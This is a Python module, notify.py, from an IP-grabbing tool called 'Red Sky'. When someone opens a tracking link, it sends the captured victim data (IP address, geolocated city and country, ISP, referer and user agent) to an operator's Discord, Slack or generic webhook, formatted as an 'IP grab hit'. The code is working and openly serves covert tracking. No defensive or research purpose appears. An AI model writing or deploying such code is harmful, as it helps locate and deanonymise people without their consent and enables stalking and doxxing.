# language: Python, file: Program/ipgrab/notify.py, target: Red Sky ipgrab — webhook
# Discord + Slack + generic JSON webhook on hit.

import json
from typing import Dict

import requests


RED_HEX = 0xFF2400  # scarlet
UA = "RedSky/0.1"


def _discord_payload(record: Dict) -> Dict:
    geo = record.get("geo") or {}
    loc = ", ".join(filter(None, [geo.get("city"), geo.get("region"), geo.get("country")]))

    fields = [
        {"name": "IP", "value": record.get("ip", "?"), "inline": True},
        {"name": "When", "value": record.get("ts", "?"), "inline": True},
    ]
    if loc:
        fields.append({"name": "Location", "value": loc, "inline": True})
    if geo.get("isp"):
        fields.append({"name": "ISP", "value": geo["isp"][:100], "inline": False})
    if record.get("referer"):
        fields.append({"name": "Referer", "value": record["referer"][:200], "inline": False})
    if record.get("ua"):
        fields.append({"name": "UA", "value": record["ua"][:200], "inline": False})

    return {
        "username": "Red Sky",
        "embeds": [{
            "title": "▓ IP grab hit",
            "color": RED_HEX,
            "fields": fields,
        }],
    }


def send_webhook(url: str, record: Dict) -> bool:
    if "discord.com/api/webhooks" in url or "discordapp.com/api/webhooks" in url:
        payload = _discord_payload(record)
    elif "hooks.slack.com" in url:
        geo = record.get("geo") or {}
        text = f"*Red Sky hit* — `{record.get('ip')}`  ({geo.get('city','?')}, {geo.get('country','?')})"
        payload = {"text": text}
    else:
        payload = record

    try:
        r = requests.post(url, json=payload, timeout=8,
                          headers={"User-Agent": UA, "Content-Type": "application/json"})
        return r.status_code < 400
    except requests.RequestException:
        return False
